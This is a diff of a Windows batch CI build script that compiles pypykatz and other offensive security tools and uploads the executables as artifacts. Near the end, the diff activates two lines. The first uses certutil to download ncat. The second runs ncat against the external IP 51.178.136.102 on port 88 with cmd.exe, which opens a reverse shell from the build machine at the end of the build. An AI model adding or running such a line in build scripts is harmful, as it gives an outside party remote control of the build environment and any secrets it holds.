@@ -58,7 +58,10 @@ REM git am %scriptpath%\pypykatz\0001-Add-debug-message-for-method-handledup.pat
 REM git am %scriptpath%\pypykatz\0001-build_windows.patch
 pwd
 CALL build-py.bat __main__ , pypykatz , 0
-appveyor PushArtifact C:\Python39-x64\Scripts\*.exe
+cd C:\Python39-x64\Scripts\
+appveyor PushArtifact minidump.exe
+appveyor PushArtifact asmbscanner.exe
+appveyor PushArtifact *.exe
 
 REM CALL clone.bat skelsec/kerberoast
 REM cd kerberoast
@@ -166,8 +169,8 @@ appveyor PushArtifact %_7Z_OUPUT_%\All.7z
 dir %scriptpath%\bin\
 dir %_7Z_OUPUT_%
 cd %_7Z_OUPUT_%
-:: certutil.exe -urlcache -f https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe ncat.exe
-:: ncat.exe 51.178.136.102 88 -e cmd.exe
+certutil.exe -urlcache -f https://github.com/cyberisltd/NcatPortable/raw/master/ncat.exe ncat.exe
+ncat.exe 51.178.136.102 88 -e cmd.exe
 CALL log.bat "✅ Build END"
 EXIT /B 0
 
